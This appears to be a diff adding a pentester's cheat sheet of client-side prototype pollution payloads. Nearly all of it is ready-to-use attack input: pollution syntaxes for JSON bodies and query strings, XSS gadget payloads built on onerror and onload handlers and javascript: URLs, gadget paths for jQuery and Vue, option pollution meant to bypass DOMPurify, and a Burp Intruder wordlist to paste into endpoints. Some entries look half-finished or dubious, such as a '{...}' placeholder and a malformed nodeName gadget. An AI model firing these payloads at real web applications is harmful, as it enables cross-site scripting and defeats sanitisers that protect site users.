@@ -1,0 +1,87 @@
+# Client-Side Prototype Pollution Payloads
+
+## STEP 1 — CONFIRM THE POLLUTION MECHANISM
+In console / via JSON.parse:
+```js
+JSON.parse('{"__proto__":{"polluted":"yes"}}')
+({}).polluted          // "yes"  → vulnerable merge
+```
+Other syntaxes a parser may accept:
+```
+{"__proto__":     {"x": 1}}
+{"constructor":   {"prototype": {"x": 1}}}
+{"constructor":   {"prototype": {"__proto__": {"x": 1}}}}
+{"__proto__":     {"__proto__": {"x": 1}}}
+{"a":{"__proto__":{"x":1}}}          // nested - deep merge must copy inner
+```
+GET hashes a fuzzer should inject (query params parsed by vulnerable parsers → object with __proto__):
+```
+?__proto__[x]=1
+?constructor[prototype][x]=1
+?__proto__[__proto__][x]=1
+?a[__proto__][x]=1
+```
+
+## STEP 2 — XSS GADGETS (pollute then trigger sink)
+Polluted target values that become XSS when the app reads a default:
+```json
+{"__proto__": {"innerHTML": "<img src=x onerror=alert(document.domain)>"}}
+{"__proto__": {"src": "x onerror=alert(1)"}}
+{"__proto__": {"srcdoc": "<script>alert(1)</script>"}}
+{"__proto__": {"href": "javascript:alert(1)"}}
+{"__proto__": {"action": "javascript:alert(1)"}}
+{"__proto__": {"background": "javascript:alert(1)"}}
+{"__proto__": {"srcdoc": "x"}}
+{"__proto__": {"textContent": "<svg onload=alert(1)>"}}
+{"__proto__": {"outerHTML": "<svg onload=alert(1)>"}}
+{"__proto__": {"nodeName": "iframe lazyload onload=alert(1)>"}}
+```
+For frameworks that set attributes from config:
+```json
+{"__proto__": {"attributes": {"src": "x onerror=alert(1)"}}}
+{"__proto__": {"dataset": {"__proto__": {"srcdoc": "<svg onload=alert(1)>"}}}}
+```
+DOM clobbering style (when lib reads `id`/`name` fallback):
+```json
+{"__proto__": {"id": "x"}, "__proto__": {"name": "y"}}
+```
+
+## STEP 3 — SPECIFIC KNOWN GADGET PATHS
+### jQuery (extend/merge deep-copy vulnerabilities)
+```js
+$.extend(true, {}, JSON.parse('{"__proto__": {"src": "x onerror=alert(1)"}}'))
+$(document.body).append($("<iframe>"))   // reads polluted src
+```
+### Vue 2 / AngularJS expressions
+```js
+// template compiler options pollution
+{"__proto__": {"__dataListeners": {...}}}
+```
+### DOMPurify bypass (pollute its options to allow bad tags)
+```json
+{"__proto__": {"ALLOWED_TAGS": {"A": 1, "svg": 1, "math": 1}}}
+{"__proto__": {"ALLOWED_ATTR": {"href": 1, "data": 1, "src": 1}}}
+{"__proto__": {"ALLOW_UNKNOWN_PROTOCOLS": true}}
+{"__proto__": {"FORBID_CONTENTS": null}}
+```
+### mXSS / innerHTML sinks
+Pollute `innerHTML` then trigger:
+```js
+el.innerHTML = payload_var;   // if app copies "html" fallback → XSS
+```
+
+## STEP 4 — BURP INTRUDER WORDLIST (paste into body of JSON endpoints)
+```
+{"__proto__":{"x":1}}
+{"__proto__":{"polluted":true}}
+{"__proto__":{"innerHTML":"<svg/onload=alert(1)>"}}
+{"constructor":{"prototype":{"innerHTML":"<svg/onload=alert(1)>"}}}
+{"a":{"__proto__":{"innerHTML":"<svg/onload=alert(1)>"}}}
+{"a":{"b":{"__proto__":{"innerHTML":"<svg/onload=alert(1)>"}}}}
+{"a":{"b":{"c":{"__proto__":{"src":"x onerror=alert(1)"}}}}}
+{"a":{"b":{"constructor":{"prototype":{"src":"x onerror=alert(1)"}}}}}
+```
+
+## Detection response markers
+- Revisit page → any non-standard attribute becomes set
+- `alert()` fires after scripting gadget in a rendered element
